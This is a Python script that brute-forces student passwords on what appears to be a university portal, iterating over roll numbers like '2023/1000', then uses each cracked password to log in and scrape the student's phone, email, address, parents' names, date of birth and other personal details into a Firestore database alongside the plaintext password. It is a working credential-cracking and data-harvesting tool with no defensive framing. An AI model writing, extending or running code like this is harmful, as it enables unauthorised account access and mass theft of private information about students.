import time
from modules.firestore_module import *
from modules.requests_module import *

def storeUserdataToDatabase(userid, password, timeTaken):
    cookie = getSessionCookie(userid, password)
    studentDetailsHtml = getStudentDetails(cookie)
    student = parseStudentDetailsHtmlToStudent(studentDetailsHtml)

    data = {
            "password":password,
            "timeTaken":timeTaken,
            "studentName":student.name,
            "phone":student.contact_no,
            "category":student.category,
            "email":student.email,
            "roll":student.roll_no, 
            "address":student.address,
            "fatherName":student.father_name,
            "motherName":student.mother_name,
            "dob":student.dob,
            "gender":student.gender,
            "studentId":student.student_id,
            "session":student.session,
            "enrollmentNo.":student.enrollment_no,
            "admissionDate":student.admission_date,
            "studentType":student.student_type,
            }
    addDataToFirestore(userid, data)
    
def storeNullUserToDatabase(userid, timeTaken):
    data = {
        "password":None,
        "studentName":None,
        "phone":None,
        "email":None,
        "roll":userid, 
        "address":None,
        "fatherName":None,
        "motherName":None,
        "dob":None,
        "gender":None,
        "category":None,
        "studentId":None,
        "session":None,
        "enrollmentNo":None,
        "admissionDate":None,
        "studentType":None,
        "timeTake":timeTaken
    }
    
    addDataToFirestore(userid, data)
    


def main():
    startuid , stopuid = getUserRangeConfig()
    print(f"Got username range from config: {startuid}, {stopuid}")

    for i in range(1000, 1005):

        formatted = '{0:04}'.format(i)
        userid = "2023/" + formatted
        print("Started for user: "  + userid)

            
        try:
            if findFirestoreStudent(userid):
                print("Password already exist in database/being cracked")
            else:
                print("Password not found in database neither being cracked")

                # print("Checking user's existence...")
                # if not checkUserExistence(userid):
                #     print("User does not exist")
                # else:
                #     print("User exists")

                initStudentToFirestore(userid)

                print("Bruteforcing started for "+userid)

                start_time = time.perf_counter()
                password = bruteforceLogin(userid, 1000)
                end_time = time.perf_counter()
                elapsedTime = str(end_time - start_time)[:8] 

                if(password is None):
                    storeNullUserToDatabase(userid, elapsedTime)
                else:
                    print("Password found: " + password)
                    storeUserdataToDatabase(userid, password, elapsedTime)
                    print("Retrived userdata and stored in database")

        except Exception as e:
            print("Error: " + str(e))
            data = {
                "error":str(e),
                }
            storeNullUserToDatabase(userid, "")



if __name__ == "__main__":
    main()